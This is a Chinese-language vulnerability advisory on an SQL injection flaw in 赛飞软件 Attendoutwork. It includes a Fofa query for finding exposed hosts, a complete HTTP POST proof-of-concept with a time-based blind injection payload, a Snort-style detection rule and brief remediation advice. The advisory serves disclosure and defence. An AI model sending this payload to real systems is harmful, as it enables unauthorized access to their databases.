# 赛飞软件 Attendoutwork 存在SQL注入漏洞

赛飞软件 Attendoutwork 存在SQL注入漏洞

# 影响版本

**赛飞软件 Attendoutwork 至今全版本**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **body=&quot;赛飞软件&quot;**

**POC/EXP：**

**step1 延时注入**

```
POST /web/Attendoutwork.asp?action=cousuo HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded

Submit=&begindate=01/01/1967&enddate=01/01/1967&keyword=yM7XwSI1');WAITFOR%20DELAY%20'0:0:1'--%20
```

​![image](assets/image-20260822235311-xcsyy5m.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"赛飞软件 Attendoutwork - SQL注入漏洞 (Time-based Blind via WAITFOR DELAY)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/web/Attendoutwork.asp"; fast_pattern;
    http.uri; content:"action=cousuo"; distance:0; nocase;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"keyword="; nocase;
    http.request_body; pcre:"/WAITFOR\s+DELAY/i";
    metadata:
        service http,
        affected_product "赛飞软件 Attendoutwork",
        vulnerability_type "SQL Injection (Time-based Blind)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000731;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。

‍
